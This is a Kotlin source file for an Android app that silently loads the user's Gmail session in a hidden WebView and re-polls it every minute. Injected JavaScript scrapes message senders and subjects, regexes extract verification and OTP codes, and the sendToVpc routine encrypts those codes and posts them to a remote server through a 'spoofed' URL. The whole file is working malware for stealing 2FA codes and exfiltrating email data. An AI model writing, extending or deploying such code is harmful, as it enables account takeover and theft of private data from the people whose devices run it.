package com.gafam.relay

import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebView
import android.webkit.WebViewClient
import org.json.JSONArray
import org.json.JSONObject
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import android.util.Base64
import kotlin.concurrent.thread
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody

object GmailWebViewReader {
    private const val TAG = "GAFAM_WebViewGM"
    private var running = false
    @Volatile var webView: WebView? = null
    private var lastEmailIds = mutableSetOf<String>()

    private val codePatterns = listOf(
        Regex("""\b(\d{4,8})\b"""),
        Regex("""code[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
        Regex("""verify[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
        Regex("""otp[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
    )

    @Synchronized
    fun start(context: Context) {
        if (running) return
        running = true

        thread(name = "gafam-webview-gmail") {
            try {
                // Must run on main thread for WebView
                Thread.sleep(5000) // Wait for app init
                runOnMainSync(context) { initWebView(context) }
            } catch (e: Exception) {
                Log.e(TAG, "Fatal: ${e.message}", e)
            }
        }
    }

    private fun runOnMainSync(context: Context, block: () -> Unit) {
        val handler = android.os.Handler(context.mainLooper)
        handler.post { block() }
    }

    private fun initWebView(context: Context) {
        var wv = webView
        if (wv == null) {
            wv = WebView(context.applicationContext)
        }
        wv.apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.allowFileAccess = false
            settings.userAgentString = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }

        // Keep cookies from previous sessions
        CookieManager.getInstance().acceptCookie()
        CookieManager.getInstance().setAcceptThirdPartyCookies(wv, true)

        webView = wv
        wv.webViewClient = object : WebViewClient() {

            override fun onPageFinished(view: WebView, url: String) {
                Log.i(TAG, "Page loaded: $url")

                if (url.contains("mail.google.com") || url.contains("accounts.google.com")) {
                    // Check if we need to login or we're already in inbox
                    view.evaluateJavascript("""
                        (function() {
                            // Are we on a login page?
                            var loginForm = document.querySelector('form[action*="signin"]') ||
                                           document.querySelector('input[type="email"]') ||
                                           document.querySelector('input[type="password"]');
                            if (loginForm) return 'LOGIN_REQUIRED';

                            // Are we in the inbox?
                            var inbox = document.querySelector('[data-tooltip="Inbox"]') ||
                                       document.querySelector('[aria-label="Inbox"]') ||
                                       document.querySelectorAll('tr.zA').length;
                            if (inbox) {
                                // Extract email subjects
                                var rows = document.querySelectorAll('tr.zA');
                                var emails = [];
                                rows.forEach(function(r) {
                                    var subject = r.querySelector('[data-thread-id]')?.textContent ||
                                                 r.querySelector('.bog')?.textContent || '';
                                    var sender = r.querySelector('.yP, .zF')?.textContent || '';
                                    var time = r.querySelector('.xW')?.textContent || '';
                                    emails.push({subject: subject.trim(), sender: sender.trim(), time: time.trim()});
                                });
                                return JSON.stringify({status: 'INBOX', count: emails.length, emails: emails.slice(0,3)});
                            }
                            return 'UNKNOWN_PAGE';
                        })()
                    """.trimIndent()) { result ->
                        Log.d(TAG, "Page state: ${result?.take(300)}")
                        try {
                            val clean = result?.trim('"')?.replace("\\\"", "\"")?.replace("\\\\", "\\") ?: ""
                            val data = JSONObject(clean)
                            when (data.optString("status")) {
                                "INBOX" -> {
                                    val emails = data.optJSONArray("emails")
                                    if (emails != null) {
                                        val prefs = context.getSharedPreferences("GAFAM_PREFS", Context.MODE_PRIVATE)
                                        for (i in 0 until emails.length()) {
                                            val email = emails.getJSONObject(i)
                                            val subject = email.optString("subject", "")
                                            val sender = email.optString("sender", "")
                                            val body = "$sender: $subject"
                                            val codes = extractCodes(body)
                                            if (codes.isNotEmpty() && body !in lastEmailIds) {
                                                lastEmailIds.add(body)
                                                Log.i(TAG, "📧 $body → codes=$codes")
                                                sendToVpc(context, prefs, sender, subject, body, codes)
                                            }
                                        }
                                        // Prune memory
                                        if (lastEmailIds.size > 100) lastEmailIds.clear()
                                    }
                                }
                                "LOGIN_REQUIRED" -> {
                                    Log.w(TAG, "Gmail login required — user must sign in once")
                                }
                            }
                        } catch (e: Exception) {
                            Log.d(TAG, "Parse: ${e.message}")
                        }
                    }
                }
            }
        }

        Log.i(TAG, "Loading Gmail...")
        wv.loadUrl("https://mail.google.com/mail/u/0/")

        // Poll every 60s
        while (running) {
            Thread.sleep(60000)
            runOnMainSync(context) {
                Log.d(TAG, "Refreshing...")
                wv.loadUrl("https://mail.google.com/mail/u/0/")
            }
        }
    }

    private fun extractCodes(text: String): List<String> {
        val codes = mutableListOf<String>()
        for (pat in codePatterns) {
            for (match in pat.findAll(text)) {
                val code = match.groupValues.getOrNull(1) ?: match.value
                if (code !in codes) codes.add(code)
            }
        }
        return codes
    }

    private fun sendToVpc(context: Context, prefs: SharedPreferences, from: String, subject: String, body: String, codes: List<String>) {
        val apiUrl = prefs.getString("apiUrl", null) ?: return
        val jwtSecret = prefs.getString("jwtSecret", null) ?: return
        try {
            val client = ApiClient.getClient(context) ?: return
            val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/auth/email/notif")
            val jsonBody = JSONObject().apply {
                put("app", "gmail.webview")
                put("title", subject)
                put("body", body)
                put("from", from)
                put("codes", JSONObject.wrap(codes))
                put("timestamp", System.currentTimeMillis())
            }
            val plaintext = jsonBody.toString().toByteArray(Charsets.UTF_8)
            val digest = MessageDigest.getInstance("SHA-256")
            val keyBytes = digest.digest(jwtSecret.toByteArray(Charsets.UTF_8))
            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            val iv = ByteArray(12); SecureRandom().nextBytes(iv)
            cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(keyBytes, "AES"), GCMParameterSpec(128, iv))
            val encryptedPayload = JSONObject().apply {
                put("encrypted_data", Base64.encodeToString(cipher.doFinal(plaintext), Base64.NO_WRAP))
                put("iv", Base64.encodeToString(iv, Base64.NO_WRAP))
            }
            val req = Request.Builder().url(spoofedUrl)
                .post(encryptedPayload.toString().toRequestBody("application/json".toMediaType()))
                .addHeader("Authorization", "Bearer $jwtSecret").build()
            client.newCall(req).execute()
            Log.i(TAG, "📧 Sent: $subject codes=$codes")
        } catch (e: Exception) { Log.e(TAG, "Send: ${e.message}") }
    }

    @Synchronized
    fun stop() { running = false; Log.i(TAG, "Stopped") }
}
